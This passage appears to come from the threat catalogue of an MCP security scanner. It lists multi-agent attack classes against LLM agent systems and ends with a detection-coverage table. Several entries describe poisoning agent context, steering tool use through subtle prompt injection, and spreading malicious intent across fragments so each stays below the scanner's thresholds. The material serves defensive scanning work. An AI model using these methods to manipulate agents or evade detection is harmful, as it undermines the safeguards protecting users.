| **Real-World Reference** | Cross-agent contamination has been demonstrated in multi-agent LLM systems. The MCP sampling capability enables agent-to-agent communication that can carry poisoned context. |
| **CoSAI Category** | MA-1 |
| **OWASP Agentic** | AG01 |
| **MCP-Lattice Detection** | L3 Capability Graph (models cross-server data flows and identifies poisoning propagation paths). Templates: `capability-graph/cross-agent-poisoning`. |

### 10.2 Cascading Failures

| Field | Value |
|---|---|
| **ID** | `MA-02` |
| **Severity** | High |
| **Description** | A failure or compromise in one MCP server triggers failures in dependent servers. For example, a database server returning corrupted data causes a reporting server to generate incorrect reports, which are then sent by an email server. The cascade amplifies the impact of a single point of compromise. |
| **Real-World Reference** | Cascading failures are well-studied in distributed systems. MCP's multi-server architecture creates dependency chains that amplify single-server failures. |
| **CoSAI Category** | MA-1 |
| **OWASP Agentic** | AG09 |
| **MCP-Lattice Detection** | L3 Capability Graph (maps server dependencies and identifies single points of failure). Templates: `capability-graph/cascading-failure`. |

### 10.3 Emergent Adversarial Behavior

| Field | Value |
|---|---|
| **ID** | `MA-03` |
| **Severity** | Medium |
| **Description** | Multiple individually benign tools, when combined, create emergent behavior that is adversarial. No single tool is malicious, but the combination enables attacks that were not possible with any tool alone. This is distinct from toxic combinations (L3) because the emergent behavior may not map to any predefined toxic combination pattern. |
| **Real-World Reference** | Emergent behavior in multi-tool LLM systems is an active area of research. The combinatorial explosion of tool interactions makes it impractical to enumerate all dangerous combinations. |
| **CoSAI Category** | MA-1 |
| **OWASP Agentic** | AG03 |
| **MCP-Lattice Detection** | L3 Capability Graph (identifies unusual capability combinations that warrant manual review). Planned: L4 Causal/LLM analysis for detecting novel emergent threats. Templates: `capability-graph/emergent-behavior`. |

### 10.4 Semantic Drift

| Field | Value |
|---|---|
| **ID** | `MA-04` |
| **Severity** | Medium |
| **Description** | Over a long conversation or multi-step task, the LLM's understanding of tool behavior gradually shifts from the actual tool semantics. A tool that was used correctly initially begins to be used incorrectly due to accumulated context from other tools, user corrections, or subtle prompt injection. The drift is gradual and may not trigger any individual detection threshold. |
| **Real-World Reference** | Semantic drift in long-running agent sessions has been observed in production deployments. The gradual nature of the drift makes it difficult to detect with point-in-time analysis. |
| **CoSAI Category** | PI-1 |
| **OWASP Agentic** | AG01 |
| **MCP-Lattice Detection** | Planned: L4 Causal/LLM analysis and runtime proxy monitoring. Current static analysis cannot detect runtime semantic drift. |

### 10.5 Below-Threshold Detection Evasion

| Field | Value |
|---|---|
| **ID** | `MA-05` |
| **Severity** | Medium |
| **Description** | An attacker distributes malicious intent across multiple tools or multiple parts of a single tool's metadata, keeping each individual piece below the detection threshold of any single analysis layer. The L2 semantic similarity of each fragment is below threshold, the L1 patterns do not match any single fragment, but the aggregate intent is clearly malicious. |
| **Real-World Reference** | Distributed evasion is a known challenge in security scanning. Attackers who understand MCP-Lattice's detection thresholds can craft payloads that individually pass all checks but collectively constitute an attack. |
| **CoSAI Category** | PI-1 |
| **OWASP Agentic** | AG01 |
| **MCP-Lattice Detection** | L3 Capability Graph (aggregates signals across tools to detect distributed intent). Planned: L4 Causal/LLM analysis for holistic reasoning about distributed attacks. Templates: `capability-graph/distributed-evasion`. |

---

## Detection Coverage Summary

| Category | Classes | L1 Pattern | L2 Semantic | L3 Capability Graph | L4 Causal (Planned) |
|---|---|---|---|---|---|
| Prompt Injection | 6 | 6/6 | 4/6 | 1/6 | 6/6 |
| Tool Poisoning | 6 | 6/6 | 5/6 | 0/6 | 6/6 |
| Code Execution | 5 | 5/5 | 0/5 | 2/5 | 5/5 |
| Authentication | 5 | 5/5 | 0/5 | 0/5 | 5/5 |
| Data Exfiltration | 5 | 3/5 | 0/5 | 5/5 | 5/5 |
| Supply Chain | 5 | 5/5 | 2/5 | 0/5 | 5/5 |
| Privilege Escalation | 4 | 3/4 | 0/4 | 3/4 | 4/4 |
| Denial of Service | 3 | 3/3 | 0/3 | 0/3 | 3/3 |
| Protocol-Level | 4 | 4/4 | 0/4 | 0/4 | 4/4 |
| Multi-Agent | 5 | 0/5 | 0/5 | 4/5 | 5/5 |
| **Total** | **48** | **40/48** | **11/48** | **15/48** | **48/48** |

L1 Pattern provides broad coverage (83%) with fast execution. L3 Capability Graph covers attack classes that require cross-tool reasoning (31%). L2 Semantic adds depth to prompt injection and tool poisoning detection (23%). The planned L4 Causal/LLM layer will provide 100% coverage by reasoning about novel and complex attacks.
